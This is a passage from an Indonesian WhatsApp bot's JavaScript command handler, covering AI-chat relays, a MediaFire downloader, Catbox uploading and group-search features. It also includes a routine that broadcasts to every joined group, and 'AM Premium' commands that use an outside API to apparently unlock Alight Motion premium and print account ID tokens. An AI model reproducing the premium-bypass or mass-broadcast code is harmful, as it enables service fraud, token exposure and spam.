  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await client.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    m = null;
  } finally {
    if (!m) m = await client.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
};

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
  return client.sendMessage(m.chat, {
    text: teks,
    mentions: [m.sender],
    contextInfo: {
      externalAdReply: {
        title: botname,
        body: `© Powered By ${namaOwner}`,
        thumbnailUrl: global.image.reply,
        sourceUrl: null,
      }
    }
  }, { quoted: qtext });
};

/// ───────── [ 𝖴𝗉𝗅𝗈𝖺𝖽𝖾𝗋 ] ───────── ///
async function uploadPixhost(buffer, filename = "file.jpg") {
  try {
    const service = new ImageUploadService('pixhost.to');
    const { directLink } = await service.uploadFromBinary(buffer, filename);
    return directLink;
  } catch (e) {
    console.error('Pixhost Upload Error:', e.message);
    return null;
  }
}

async function uploadCatbox(buffer, filename = 'file.jpg') {
  const form = new FormData();

  form.set('reqtype', 'fileupload');
  form.set(
    'fileToUpload',
    new Blob([buffer]),
    filename
  );

  const res = await fetch(
    'https://catbox.moe/user/api.php',
    {
      method: 'POST',
      body: form
    }
  );

  const data = await res.text();

  if (!data.startsWith('https://')) {
    throw new Error(data);
  }

  return data.trim();
}

function cleanHTML(text = '') {
  return text
    .replace(/<br\s*\/?>/gi, '\n')
    .replace(/<\/p>/gi, '\n')
    .replace(/<[^>]*>/g, '')
    .replace(/&nbsp;/g, ' ')
    .replace(/\n\s*\n/g, '\n')
    .trim();
}

const NamaIcon = [
  'REVIEW',
  'DOCUMENT',
  'PROMOTION',
  'OPENWEBVIEW',
];
function namaicon() {
  return NamaIcon[Math.floor(Math.random() * NamaIcon.length)];
}

/// ───────── [ 𝖠𝗎𝗍𝗈 𝖠𝖨 𝖢𝗁𝖺𝗍 ] ───────── ///
global.autoClaude2 ??= {};

if (
  global.autoClaude2[m.chat] &&
  !isCmd &&
  budy &&
  !m.key.fromMe
) {
  try {
    const axios = require("axios");

    let { data } = await axios.get(
      `https://api.synoxcloud.xyz/ai-chat/claude-opus-4.8?pesan=${encodeURIComponent(budy)}`
    );

    let replyClaude = "";

    if (typeof data === "string") {
      replyClaude = data;
    } else if (typeof data.result === "string") {
      replyClaude = data.result;
    } else if (typeof data.response === "string") {
      replyClaude = data.response;
    } else if (typeof data.message === "string") {
      replyClaude = data.message;
    } else if (typeof data.data === "string") {
      replyClaude = data.data;
    } else if (data.result && typeof data.result === "object") {
      replyClaude =
        data.result.answer ||
        data.result.text ||
        data.result.content ||
        data.result.message ||
        data.result.reply ||
        data.result.response ||
        "";
    }

    if (!replyClaude) {
      replyClaude = JSON.stringify(data, null, 2);
    }

    await xreply(String(replyClaude));
    return;

  } catch (e) {
    console.log("ClaudeAI2 Error:", e);
  }
}

global.autoClaude ??= {};

if (
  global.autoClaude[m.chat] &&
  !isCmd &&
  budy &&
  !m.key.fromMe
) {
  try {
    const axios = require("axios");

    let { data } = await axios.get(
      `https://api.synoxcloud.xyz/ai-chat/claude-opus-4.5?pesan=${encodeURIComponent(budy)}`
    );

    let replyClaude = "";

    if (typeof data === "string") {
      replyClaude = data;
    } else if (typeof data.result === "string") {
      replyClaude = data.result;
    } else if (typeof data.response === "string") {
      replyClaude = data.response;
    } else if (typeof data.message === "string") {
      replyClaude = data.message;
    } else if (typeof data.data === "string") {
      replyClaude = data.data;
    } else if (data.result && typeof data.result === "object") {
      replyClaude =
        data.result.answer ||
        data.result.text ||
        data.result.content ||
        data.result.message ||
        data.result.reply ||
        data.result.response ||
        "";
    }

    if (!replyClaude) {
      replyClaude = JSON.stringify(data, null, 2);
    }

    await xreply(String(replyClaude));
    return;

  } catch (e) {
    console.log("Claude Error:", e);
  }
}

global.autoGPT ??= {};

if (
  global.autoGPT[m.chat] &&
  !isCmd &&
  budy &&
  !m.key.fromMe
) {
  try {
    const axios = require("axios");

    if (quoted && /image/.test(mime)) {
      await xreply("⏳ Sedang mengupload gambar...");

      let media = await client.downloadAndSaveMediaMessage(qmsg);

      const { ImageUploadService } = require('node-upload-images');
      const service = new ImageUploadService('pixhost.to');

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        'MISTER-MD-md.jpg'
      );

      fs.unlinkSync(media);

      await xreply("🎨 Sedang mengedit gambar...");

      let api = `https://api.synoxcloud.xyz/edit/gpt-image?imageUrl=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(budy)}`;

      await client.sendMessage(m.chat, {
        image: { url: api },
        caption: `✨ *GPT Image Editor*

📝 Prompt: ${budy}

🔗 Source: Pixhost`
      }, { quoted: m });

      return;
    }

    let { data } = await axios.get(
      `https://api.synoxcloud.xyz/ai-chat/gpt-5.5?pesan=${encodeURIComponent(budy)}`
    );

    let hasil =
      data?.result?.reply ||
      data?.result?.message ||
      data?.message ||
      "Tidak ada respon";

    await xreply(String(hasil));
    return;

  } catch (e) {
    console.log("AutoGPT Error:", e);
  }
}

/// ───────── [ 𝖢𝗈𝗈𝗅𝖽𝗈𝗐𝗇 𝖧𝖾𝗅𝗉𝖾𝗋 ] ───────── ///
global.cooldowns ??= new Map();

function checkCooldown(userId, command, duration = 60000) {
  const key = `${userId}:${command}`;
  const now = Date.now();

  const expires = global.cooldowns.get(key);

  if (!expires || now >= expires) {
    return {
      allowed: true,
      remainingTime: 0
    };
  }

  return {
    allowed: false,
    remainingTime: Math.ceil((expires - now) / 1000)
  };
}

function recordUsage(userId, command, duration = 60000) {
  const key = `${userId}:${command}`;
  global.cooldowns.set(key, Date.now() + duration);
}

const ZX_CONFIG = {
  BASE_URL: 'https://auto-reaction.zxcoderid.web.id',
  TIMEOUT: 60000
};

async function getGroupList(client) {
  const groups = Object.values(await client.groupFetchAllParticipating());
  return groups.map(group => ({
    id: group.id,
    subject: group.subject,
    participants: group.participants?.length || 0
  }));
}

global.tempGroupStatusSelections = global.tempGroupStatusSelections || new Map();

const jam = new Date().toLocaleTimeString('id-ID');
let start = Date.now();
let latensi = Date.now() - start;
let total = totalfitur();

/// ───────────── [ 𝖩𝖯𝖬 𝖦𝗋𝗈𝗎𝗉 𝖡𝗋𝗈𝖺𝖽𝖼𝖺𝗌𝗍 𝖧𝖾𝗅𝗉𝖾𝗋𝗌 ] ───────────── ///
const getJpmText = () => String(text || m.quoted?.text || m.quoted?.body || '').trim();
const getJpmMime = () => String(mime || qmsg?.mimetype || qmsg?.msg?.mimetype || '').trim();

const broadcastJpmGroups = async (label, buildMessage) => {
  const allGroups = await client.groupFetchAllParticipating();
  const groups = Object.keys(allGroups || {}).filter((id) => id.endsWith('@g.us'));
  const targets = groups.filter((id) => global.db?.groups?.[id]?.blacklistjpm !== true);
  const skipped = groups.length - targets.length;
  const configuredDelay = Number(global.delayJpm);
  const delay = Number.isFinite(configuredDelay) && configuredDelay >= 0 ? configuredDelay : 3500;
  let sent = 0;
  let failed = 0;

  await xreply(
    `⏳ *Memproses ${label}*\n` +
    `Target: *${targets.length} grup*\n` +
    (skipped ? `Dilewati (blacklist JPM): *${skipped} grup*` : 'Mengirim ke semua grup yang tidak di-blacklist.')
  );

  for (let index = 0; index < targets.length; index++) {
    const groupId = targets[index];
    try {
      await client.sendMessage(groupId, buildMessage(groupId));
      sent++;
    } catch (error) {
      failed++;
      console.error(`[${label}] Gagal mengirim ke ${groupId}:`, error?.message || error);
    }

    if (delay > 0 && index < targets.length - 1) {
      await sleep(delay);
    }
  }

  await client.sendMessage(m.chat, {
    text:
      `✅ *${label} selesai*\n` +
      `• Berhasil: *${sent} grup*\n` +
      `• Gagal: *${failed} grup*\n` +
      `• Blacklist dilewati: *${skipped} grup*`
  }, { quoted: m });

  return { sent, failed, skipped, total: groups.length };
};

const date = (() => {
  const parts = new Intl.DateTimeFormat('id-ID', {
    weekday: 'long',
    day: '2-digit',
    month: 'long',
    year: 'numeric',
    timeZone: 'Asia/Jakarta'
  }).formatToParts(new Date());

  const getPart = (type) => parts.find(part => part.type === type)?.value || '';
  return `${getPart('weekday')}, ${getPart('day')} - ${getPart('month')} - ${getPart('year')}`;
})()

switch (command) {
/// ───────────── [ 𝖬𝖾𝗇𝗎 𝖴𝗍𝖺𝗆𝖺 ] ──────────── ///
  
  case "menu": {
    await menu(client, m, chatUpdate, store, args);
  }
  break

  case "allmenu": {
    await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    await allmenu(client, m, chatUpdate, store, args);
  }
  break

  case "ownemenu":
  case "ownermenu": {
    await client.sendMessage(m.chat, { react: { text: '👑', key: m.key } })
    await ownermenu(client, m, chatUpdate, store, args);
  }
  break

  case "jadibotmenu": {
    await client.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
    await jadibotmenu(client, m, chatUpdate, store, args);
  }
  break

  case "paymentmenu":
  case "paymenu": {
    await client.sendMessage(m.chat, { react: { text: '💳', key: m.key } })
    await paymentmenu(client, m, chatUpdate, store, args);
  }
  break

  case "pterodactylmenu": {
    await client.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })
    await pterodactylmenu(client, m, chatUpdate, store, args);
  }
  break

  case "aimenu": {
    await client.sendMessage(m.chat, { react: { text: '👾', key: m.key } })
    await aimenu(client, m, chatUpdate, store, args);
  }
  break

  case "downloadmenu": {
    await client.sendMessage(m.chat, { react: { text: '📥', key: m.key } })
    await downloadmenu(client, m, chatUpdate, store, args);
  }
  break

  case "stickermenu": {
    await client.sendMessage(m.chat, { react: { text: '🧩', key: m.key } })
    await stickermenu(client, m, chatUpdate, store, args);
  }
  break

  case "imagemenu": {
    await client.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
    await imagemenu(client, m, chatUpdate, store, args);
  }
  break

  case "makermenu": {
    await client.sendMessage(m.chat, { react: { text: '🚀', key: m.key } })
    await makermenu(client, m, chatUpdate, store, args);
  }
  break

  case "toolsmenu": {
    await client.sendMessage(m.chat, { react: { text: '🔧', key: m.key } })
    await toolsmenu(client, m, chatUpdate, store, args);
  }
  break

  case "groupmenu": {
    await client.sendMessage(m.chat, { react: { text: '👥', key: m.key } })
    await groupmenu(client, m, chatUpdate, store, args);
  }
  break

  case "jpmmenu": {
    await client.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
    await jpmmenu(client, m, chatUpdate, store, args);
  }
  break

  case "stalkmenu": {
    await client.sendMessage(m.chat, { react: { text: '👀', key: m.key } })
    await stalkmenu(client, m, chatUpdate, store, args);
  }
  break

  case "searchmenu": {
    await client.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })
    await searchmenu(client, m, chatUpdate, store, args);
  }
  break

  case "randommenu": {
    await client.sendMessage(m.chat, { react: { text: '🎲', key: m.key } })
    await randommenu(client, m, chatUpdate, store, args);
  }
  break

  case "storemenu": {
    await client.sendMessage(m.chat, { react: { text: '🛒', key: m.key } })
    await storemenu(client, m, chatUpdate, store, args);
  }
  break

  case "funmenu": {
    await client.sendMessage(m.chat, { react: { text: '🎭', key: m.key } })
    await funmenu(client, m, chatUpdate, store, args);
  }
  break

  case "gamemenu": {
    await client.sendMessage(m.chat, { react: { text: '🎮', key: m.key } })
    await gamemenu(client, m, chatUpdate, store, args);
  }
  break

  case "quotemenu": {
    await client.sendMessage(m.chat, { react: { text: '🗯️', key: m.key } })
    await quotemenu(client, m, chatUpdate, store, args);
  }
  break

  case "utilitymenu": {
    await client.sendMessage(m.chat, { react: { text: '🛠️', key: m.key } })
    await utilitymenu(client, m, chatUpdate, store, args);
  }
  break

  /// ───────────── [ 𝖲𝖾𝖺𝗋𝖼𝗁 & 𝖥𝖾𝗍𝖼𝗁𝖾𝗋 ] ──────────── ///
  case "group": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("cari teman")
        )
      }

      await xreply("🔎 Sedang mencari grup...")

      const apiUrl =
        "https://api.nexray.eu.cc/search/groupsor?q=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log(
        "GROUPSOR RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !Array.isArray(data?.result)) {
        return xreply(
          "❌ API tidak memberikan hasil yang valid."
        )
      }

      const results = data.result

      if (results.length === 0) {
        return xreply(
          `❌ Tidak ditemukan grup untuk: *${query}*`
        )
      }

      const limit = 50
      const tampilkan = results.slice(0, limit)
      const total = results.length

      let teks =
        `🔎 *SEARCH GROUP*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🔍 Query: *${query}*\n` +
        `📊 Ditemukan: *${total} grup*\n` +
        `📋 Ditampilkan: *${tampilkan.length} grup*\n\n`

      tampilkan.forEach((group, index) => {
        teks +=
          `*${index + 1}. ${group.name || "Tanpa Nama"}*\n` +
          `📝 ${group.description || "Tidak ada deskripsi"}\n` +
          `📂 Kategori: ${group.category || "-"}\n` +
          `🌍 Negara: ${group.country || "-"}\n` +
          `🔗 ${group.url || "-"}\n\n`
      })

      if (total > limit) {
        teks += `⚠️ _Dan ${total - limit} grup lainnya..._\n\n`
      }

      teks +=
        `━━━━━━━━━━━━━━━━━━\n` +
        `MISTER-MD`

      await xreply(teks)

    } catch (err) {
      console.error(
        "GROUPSOR ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mencari grup.\n" +
        "API mungkin sedang error atau timeout."
      )
    }
  }
  break

  /// ───────────── [ 𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
  case "mfdl":
  case "mediafire": {
    const fs = require("fs")
    const path = require("path")
    const cheerio = require("cheerio")

    let filePath = null

    try {
      const mediafireUrl = text?.trim()

      if (!mediafireUrl) {
        return xreply(
          example("https://www.mediafire.com/file/xxxxx/file")
        )
      }

      if (!/^https?:\/\/(www\.)?mediafire\.com\//i.test(mediafireUrl)) {
        return xreply(
          "❌ URL MediaFire tidak valid."
        )
      }

      await xreply(
        "⏳ *MEDIAFIRE DOWNLOADER*\n\n" +
        "🔎 Mencari link download..."
      )

      const session = axios.create({
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/120.0.0.0 Safari/537.36",
          "Accept":
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        },
        timeout: 30000,
        maxRedirects: 10
      })

      const response = await session.get(mediafireUrl)
      const $ = cheerio.load(response.data)

      let downloadUrl = null

      downloadUrl = $("#downloadButton").attr("href") || null

      if (!downloadUrl) {
        downloadUrl =
          $("a.download_link").attr("href") || null
      }

      if (!downloadUrl) {
        const links = $('a[href*="download"]')

        if (links.length > 0) {
          downloadUrl =
            links.first().attr("href") || null
        }
      }

      if (!downloadUrl) {
        const match = response.data.match(
          /href="(https:\/\/download\d+\.mediafire\.com\/[^"]+)"/
        )

        if (match) {
          downloadUrl = match[1]
        }
      }

      if (!downloadUrl) {
        return xreply(
          "❌ Direct download MediaFire tidak ditemukan."
        )
      }

      if (downloadUrl.startsWith("/")) {
        downloadUrl =
          new URL(
            downloadUrl,
            mediafireUrl
          ).href
      }

      await xreply(
        "📥 Link download ditemukan.\n" +
        "⬇️ Sedang mengunduh file..."
      )

      const outputDir = path.join(
        process.cwd(),
        "downloads"
      )

      if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, {
          recursive: true
        })
      }

      let filename = null

      try {
        const urlObj = new URL(downloadUrl)
        filename = path.basename(
          decodeURIComponent(urlObj.pathname)
        )
      } catch (e) { }

      if (!filename || filename === "/" || filename === ".") {
        filename =
          $("div.filename").first().text().trim() ||
          $("meta[property='og:title']")
            .attr("content") ||
          "mediafire_file"
      }

      filename = filename
        .replace(/[<>:"/\\|?*\x00-\x1F]/g, "_")
        .trim()

      if (!filename) {
        filename = "mediafire_file"
      }

      filePath = path.join(
        outputDir,
        `${Date.now()}_${filename}`
      )

      const fileResponse = await session.get(
        downloadUrl,
        {
          responseType: "arraybuffer",
          timeout: 300000,
          maxContentLength: Infinity,
          maxBodyLength: Infinity
        }
      )

      fs.writeFileSync(
        filePath,
        Buffer.from(fileResponse.data)
      )

      const stats = fs.statSync(filePath)

      if (!stats.size) {
        throw new Error(
          "File hasil download kosong."
        )
      }

      const sizeMB =
        (stats.size / 1024 / 1024).toFixed(2)

      await xreply(
        `✅ *DOWNLOAD BERHASIL*\n\n` +
        `📁 File: *${filename}*\n` +
        `📦 Size: *${sizeMB} MB*\n\n` +
        `📤 Mengirim file...`
      )

      const ext = path
        .extname(filename)
        .toLowerCase()

      const mimeMap = {
        ".zip": "application/zip",
        ".rar": "application/vnd.rar",
        ".7z": "application/x-7z-compressed",
        ".pdf": "application/pdf",
        ".txt": "text/plain",
        ".json": "application/json",
        ".js": "text/javascript",
        ".html": "text/html",
        ".css": "text/css",
        ".apk": "application/vnd.android.package-archive",
        ".mp3": "audio/mpeg",
        ".mp4": "video/mp4",
        ".jpg": "image/jpeg",
        ".jpeg": "image/jpeg",
        ".png": "image/png",
        ".webp": "image/webp",
        ".gif": "image/gif"
      }

      const mimetype =
        mimeMap[ext] ||
        "application/octet-stream"

      await client.sendMessage(
        m.chat,
        {
          document: fs.readFileSync(filePath),
          mimetype: mimetype,
          fileName: filename,
          caption:
            `📁 *${filename}*\n` +
            `📦 ${sizeMB} MB\n` +
            `🔗 Source: MediaFire`
        },
        {
          quoted: m
        }
      )

    } catch (err) {
      console.error(
        "MEDIAFIRE ERROR:",
        err?.response?.data || err
      )

      await xreply(
        "❌ *MEDIAFIRE DOWNLOAD GAGAL*\n\n" +
        `${err?.message || "Terjadi kesalahan saat download."}`
      )

    } finally {
      try {
        if (
          filePath &&
          fs.existsSync(filePath)
        ) {
          fs.unlinkSync(filePath)
        }
      } catch (e) {
        console.error(
          "Gagal menghapus temporary file:",
          e
        )
      }
    }
  }
  break

  /// ───────────── [ 𝖢𝖺𝗍𝖻𝗈𝗑 𝖴𝗉𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
  case "catbox": {
    const fs = require("fs")
    const path = require("path")
    const FormData = require("form-data")

    const BASE = "https://catbox.moe"
    const JS_URL = `${BASE}/resources/uploadform.js`

    const UA =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
      "AppleWebKit/537.36 (KHTML, like Gecko) " +
      "Chrome/126.0.0.0 Safari/537.36"

    const MIME = {
      ".png": "image/png",
      ".jpg": "image/jpeg",
      ".jpeg": "image/jpeg",
      ".gif": "image/gif",
      ".webp": "image/webp",
      ".txt": "text/plain",
      ".pdf": "application/pdf",
      ".mp4": "video/mp4",
      ".zip": "application/zip",
      ".rar": "application/vnd.rar",
      ".7z": "application/x-7z-compressed",
      ".mp3": "audio/mpeg",
      ".m4a": "audio/mp4",
      ".wav": "audio/wav"
    }

    const timeoutSignal = (ms = 600000) => {
      const controller = new AbortController()

      const timer = setTimeout(() => {
        controller.abort()
      }, ms)

      timer.unref?.()

      return controller.signal
    }

    const scrapeForm = async () => {
      const res = await fetch(BASE, {
        headers: {
          "User-Agent": UA
        },
        signal: timeoutSignal(30000)
      })

      if (!res.ok) {
        throw new Error(
          `Gagal membuka Catbox: HTTP ${res.status}`
        )
      }

      const html = await res.text()

      const match =
        html.match(
          /<form[^>]*class="dropzone"[^>]*>[\s\S]*?<\/form>/i
        ) ||
        html.match(
          /<form[^>]*id="dropzoneUpload"[^>]*>[\s\S]*?<\/form>/i
        )

      if (!match) {
        throw new Error(
          "Form upload Catbox tidak ditemukan."
        )
      }

      const formHtml = match[0]

      const actionMatch =
        formHtml.match(/action="([^"]+)"/i)

      if (!actionMatch) {
        throw new Error(
          "Action upload Catbox tidak ditemukan."
        )
      }

      const action =
        BASE +
        "/" +
        actionMatch[1].replace(/^\//, "")

      const fields = {}

      for (
        const tag of
        formHtml.match(/<input[^>]*>/gi) || []
      ) {
        const type =
          tag.match(/\btype="([^"]*)"/i)?.[1]

        const name =
          tag.match(/\bname="([^"]*)"/i)?.[1]

        const value =
          tag.match(/\bvalue="([^"]*)"/i)?.[1]

        if (
          type?.toLowerCase() === "hidden" &&
          name
        ) {
          fields[name] = value || ""
        }
      }

      return {
        action,
        fields
      }
    }

    const scrapeJsParam = async () => {
      const res = await fetch(JS_URL, {
        headers: {
          "User-Agent": UA
        },
        signal: timeoutSignal(30000)
      })

      if (!res.ok) {
        throw new Error(
          `Gagal mengambil uploadform.js: HTTP ${res.status}`
        )
      }

      const js = await res.text()

      const match =
        js.match(/paramName\s*:\s*"([^"]+)"/)

      if (!match) {
        throw new Error(
          "paramName upload Catbox tidak ditemukan."
        )
      }

      return match[1]
    }

    const uploadFile = async (
      filePath,
      form,
      fileField
    ) => {
      const fd = new FormData()

      for (
        const [key, value]
        of Object.entries(form.fields)
      ) {
        fd.append(key, value)
      }

      const ext =
        path
          .extname(filePath)
          .toLowerCase()

      fd.append(
        fileField,
        fs.createReadStream(filePath),
        {
          filename:
            path.basename(filePath),

          contentType:
            MIME[ext] ||
            "application/octet-stream"
        }
      )

      const axios = require("axios")

      const res = await axios.post(
        form.action,
        fd,
        {
          headers: {
            ...fd.getHeaders(),
            "User-Agent": UA,
            "Referer": `${BASE}/`,
            "Origin": BASE,
            "X-Requested-With":
              "XMLHttpRequest"
          },

          maxBodyLength: Infinity,
          maxContentLength: Infinity,

          timeout: 600000,

          validateStatus: () => true
        }
      )

      const body =
        String(res.data || "").trim()

      if (
        res.status === 200 &&
        /^https?:\/\/(i|litterbox)\.catbox\.moe\//i.test(body)
      ) {
        return body
      }

      if (
        res.status === 412 &&
        /invalid uploader/i.test(body)
      ) {
        throw new Error(
          "Catbox menolak IP server ini (412 Invalid uploader)."
        )
      }

      throw new Error(
        `Catbox gagal (HTTP ${res.status}): ${body.slice(0, 300)}`
      )
    }

    const uploadViaUrl = async (
      url,
      form
    ) => {
      const axios = require("axios")

      const fd = new FormData()

      fd.append(
        "reqtype",
        "urlupload"
      )

      fd.append(
        "userhash",
        form.fields.userhash || ""
      )

      fd.append(
        "url",
        url
      )

      const res = await axios.post(
        form.action,
        fd,
        {
          headers: {
            ...fd.getHeaders(),
            "User-Agent": UA,
            "Referer": `${BASE}/`
          },

          timeout: 600000,

          validateStatus: () => true
        }
      )

      const body =
        String(res.data || "").trim()

      if (
        res.status === 200 &&
        body.startsWith("http")
      ) {
        return body
      }

      if (
        res.status === 412 &&
        /invalid uploader/i.test(body)
      ) {
        throw new Error(
          "Catbox menolak IP server ini (412 Invalid uploader)."
        )
      }

      throw new Error(
        `Upload URL gagal (HTTP ${res.status}): ${body.slice(0, 300)}`
      )
    }

    let media = null

    try {
      const input =
        text?.trim()

      if (
        input &&
        /^https?:\/\//i.test(input)
      ) {
        await xreply(
          "⏳ Mengupload URL ke Catbox..."
        )

        const form =
          await scrapeForm()

        const result =
          await uploadViaUrl(
            input,
            form
          )

        return xreply(
          "✅ *CATBOX UPLOAD BERHASIL*\n\n" +
          `🔗 ${result}`
        )
      }

      const qmsg =
        m.quoted || m

      const mime =
        qmsg?.mime || ""

      if (!mime) {
        return xreply(
          example(
            "reply foto/video/file atau masukkan URL"
          )
        )
      }

      await xreply(
        "⏳ Mengupload media ke Catbox..."
      )

      media =
        await client.downloadAndSaveMediaMessage(
          qmsg
        )

      if (
        !media ||
        !fs.existsSync(media)
      ) {
        throw new Error(
          "File media gagal didownload."
        )
      }

      const form =
        await scrapeForm()

      const fileField =
        await scrapeJsParam()

      const result =
        await uploadFile(
          media,
          form,
          fileField
        )

      await xreply(
        "✅ *CATBOX UPLOAD BERHASIL*\n\n" +
        `🔗 ${result}`
      )

    } catch (err) {
      console.error(
        "CATBOX ERROR:",
        err?.response?.data ||
        err?.message ||
        err
      )

      await xreply(
        "❌ *CATBOX UPLOAD GAGAL*\n\n" +
        `${err?.message || "Terjadi kesalahan."}`
      )

    } finally {
      try {
        if (
          media &&
          fs.existsSync(media)
        ) {
          fs.unlinkSync(media)
        }
      } catch (e) {
        console.error(
          "Gagal menghapus file temporary:",
          e
        )
      }
    }
  }
  break

  /// ───────────── [ 𝖠𝖬 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 ] ──────────── ///
  case "amsend2": {
    try {
      const email = text?.trim()

      if (!email) {
        return xreply(
          example("user@gmail.com")
        )
      }

      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        return xreply(
          "❌ Format email tidak valid.\n\n" +
          example("user@gmail.com")
        )
      }

      await xreply(
        "📨 Sedang mengirim verification link ke email...\n" +
        "⏳ Mohon tunggu..."
      )

      const response = await axios.get(
        "https://v2.api-varhad.my.id/tools/amprem/verif/email",
        {
          params: {
            email: email
          },
          headers: {
            "Accept": "application/json"
          },
          timeout: 60000
        }
      )

      const data = response.data

      console.log(
        "AMSEND V2 RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result?.success) {
        return xreply(
          "❌ Gagal mengirim verification link.\n" +
          `Pesan: ${data?.result?.message || "API tidak memberikan response valid."}`
        )
      }

      await xreply(
        "✅ *AM SEND V2 BERHASIL*\n" +
        "━━━━━━━━━━━━━━━━━━\n" +
        `📧 Email: ${email}\n` +
        `📩 Status: ${data.result.message || "Link dikirim."}\n\n` +
        `_Cek inbox/spam email target, lalu ambil link verifikasinya dan jalankan:_\n` +
        example(`${prefix}amverif2 ${email}|https://alight-creative.firebaseapp.com/__/auth/links?link=...`)
      )

    } catch (err) {
      console.error(
        "AMSEND V2 ERROR:",
        err?.response?.data || err
      )

      const errorData =
        err?.response?.data

      return xreply(
        "❌ Gagal mengirim verification link.\n\n" +
        (
          errorData
            ? JSON.stringify(errorData, null, 2)
            : err.message
        )
      )
    }
  }
  break

  case "amverif": {
    try {
      const input = text?.trim()

      if (!input) {
        return xreply(
          example("user@gmail.com|https://alight-creative.firebaseapp.com/__/auth/links?link=xxxx")
        )
      }

      const separator = input.indexOf("|")

      if (separator === -1) {
        return xreply(
          "❌ Format salah.\n\n" +
          "Gunakan pemisah `|` antara email dan link:\n" +
          example("user@gmail.com|https://alight-creative.firebaseapp.com/__/auth/links?link=xxxx")
        )
      }

      const email = input
        .slice(0, separator)
        .trim()

      const link = input
        .slice(separator + 1)
        .trim()

      if (!email) {
        return xreply(
          "❌ Email tidak boleh kosong."
        )
      }

      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        return xreply(
          "❌ Format email tidak valid."
        )
      }

      if (!/^https?:\/\//i.test(link)) {
        return xreply(
          "❌ Link verifikasi tidak valid.\n" +
          "Link harus diawali http:// atau https://"
        )
      }

      await xreply(
        "🔐 Sedang melakukan verifikasi AM Premium...\n" +
        "⏳ Mohon tunggu..."
      )

      const response = await axios.get(
        "https://v2.api-varhad.my.id/tools/amprem/verif/link",
        {
          params: {
            email: email,
            link: link
          },
          headers: {
            "Accept": "application/json"
          },
          timeout: 120000
        }
      )

      const data = response.data

      console.log(
        "AM VERIF V2 RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result?.success) {
        return xreply(
          "❌ Verifikasi gagal.\n" +
          `Pesan: ${data?.result?.message || "API tidak memberikan response valid."}`
        )
      }

      const result = data.result
      let hasil = ""

      if (result.user || result.idToken || result.premium) {
        const user = result.user || {}
        const premium = result.premium?.data?.result || {}

        hasil =
          "🔐 *AM VERIF V2 BERHASIL*\n" +
          "━━━━━━━━━━━━━━━━━━\n" +
          `👤 Nama     : ${user.displayName || "-"}\n` +
          `📧 Email    : ${user.email || email}\n` +
          `✔️ Verified : ${user.emailVerified ? "Ya" : "Tidak"}\n` +
          `👑 Premium  : ${premium.valid ? "Aktif ✅" : "Tidak Aktif ❌"}\n` +
          `🔁 AutoRenew: ${premium.autoRenewing ? "Ya" : "Tidak"}\n` +
          `📅 Expired  : ${premium.expiryTimeMillis ? new Date(Number(premium.expiryTimeMillis)).toLocaleString("id-ID") : "-"}\n\n` +
          (result.idToken
            ? `🔑 *ID Token:*\n${result.idToken}\n\n`
            : "") +
          "━━━━━━━━━━━━━━━━━━\n" +
          `👤 Author: ${global.botname}`
      } else {
        hasil =
          "🔐 *AM VERIF V2 BERHASIL*\n" +
          "━━━━━━━━━━━━━━━━━━\n" +
          `📧 Email: ${email}\n` +
          `📩 Status: ${result.message || "Berhasil."}\n` +
          "━━━━━━━━━━━━━━━━━━\n" +
          `👤 Author: ${global.botname}`
      }

      await xreply(hasil)

    } catch (err) {
      console.error(
        "AM VERIF V2 ERROR:",
        err?.response?.data || err
      )

      const errorData =
        err?.response?.data

      return xreply(
        "❌ Verifikasi gagal.\n\n" +
        (
          errorData
            ? JSON.stringify(errorData, null, 2)
            : err.message
        )
